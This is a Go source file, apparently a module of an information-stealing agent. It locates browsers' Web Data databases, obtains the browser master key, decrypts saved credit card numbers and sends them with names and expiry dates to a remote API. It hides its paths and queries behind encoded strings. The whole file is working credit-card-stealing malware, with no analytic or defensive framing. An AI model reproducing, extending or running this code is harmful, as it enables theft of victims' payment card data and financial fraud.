package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"database/sql"
	"os"
	"path"
	"sync"

	_ "github.com/mattn/go-sqlite3"
)

func readCards(p string, bp string) []vars.TCard {
	var (
		res  []vars.TCard
		rows *sql.Rows = nil
		db   *sql.DB   = nil
	)

	state := path.Join(bp, lib.Decode(vars.Path_localst))
	master, err := lib.GetMaster(state)
	if err != nil {
		return res
	}

	temp := lib.CopyTemp(p)
	if temp == "" {
		goto DONE
	}

	db, err = sql.Open("sqlite3", temp)
	if err != nil {
		goto DONE
	}

	rows, err = db.Query(lib.Decode(vars.Query_card))
	if err != nil {
		lib.Print(vars.Msg_DumpError,
			lib.Decode(vars.Module_card), err.Error())
		goto DONE
	}
	defer rows.Close()

	for rows.Next() {
		var (
			card  vars.TCard
			enc   []byte
			month string
			year  string
		)

		err := rows.Scan(&card.Name, &month, &year, &enc)
		if err != nil {
			continue
		}

		card.Expire = month + "/" + year
		card.Number, err = lib.DecryptPass(string(enc), master)
		if err != nil {
			continue
		}

		res = append(res, card)
	}

DONE:
	if rows != nil {
		rows.Close()
	}

	if db != nil {
		db.Close()
	}

	lib.CleanTemp(temp)
	return res
}

func dumpCards(b vars.Browser) ([]vars.TCard, error) {
	var res []vars.TCard
	dec := lib.Decode(b.Path)

	if dec == "" {
		return res, lib.NewErr(vars.Msg_BadEnc)
	}

	fp := path.Join(os.Getenv(lib.Decode(b.Prefix)), dec)
	wdata := lib.FindFiles(fp,
		lib.Decode(vars.Path_webdata), false)

	for _, w := range wdata {
		res = append(res, readCards(w, fp)...)
	}

	for i := range res {
		res[i].From = lib.Decode(b.Name)
	}

	return res, nil
}

func GetCards(wg *sync.WaitGroup) {
	for _, b := range vars.Browsers {
		cs, err := dumpCards(b)
		if err != nil {
			lib.Print(vars.Msg_DumpError,
				lib.Decode(vars.Module_card), err.Error())
		}
		vars.Agent.Card = append(vars.Agent.Card, cs...)
	}

	lib.Print(vars.Msg_Entries,
		lib.Decode(vars.Module_card), len(vars.Agent.Card))
	err := api.SendJSON(lib.Decode(vars.Module_card), struct {
		Cards []vars.TCard `json:"ST_MAP$json.card_data$"`
	}{
		Cards: vars.Agent.Card,
	})

	if err != nil {
		lib.Print(vars.Msg_FailSend,
			lib.Decode(vars.Module_card), err.Error())
	}

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_card))
	wg.Done()
}
